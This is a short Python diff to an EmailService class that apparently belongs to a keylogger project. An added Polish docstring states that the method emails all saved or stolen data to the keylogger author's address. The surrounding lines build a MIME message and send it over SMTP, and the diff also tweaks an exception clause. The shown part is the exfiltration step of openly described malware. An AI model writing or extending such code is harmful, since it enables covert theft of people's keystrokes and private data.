@@ -11,6 +11,11 @@ class EmailService:
 
     @staticmethod
     def send_email(filenames):
+        """
+            Metoda wysyła maila z wszystkimi (zapisanych / ukradzionymi) danymi na adress programisty keyloggera.
+            :param filenames:
+            :return:
+        """
         msg = MIMEMultipart()
         msg['From'] = email_address
         msg['To'] = to_address
@@ -34,5 +39,5 @@ class EmailService:
             s.sendmail(email_address, to_address, text)
             s.quit()
             print("Sending email succeeded")
-        except Exception:
+        except Exception as e:
             print("Sending email failed")
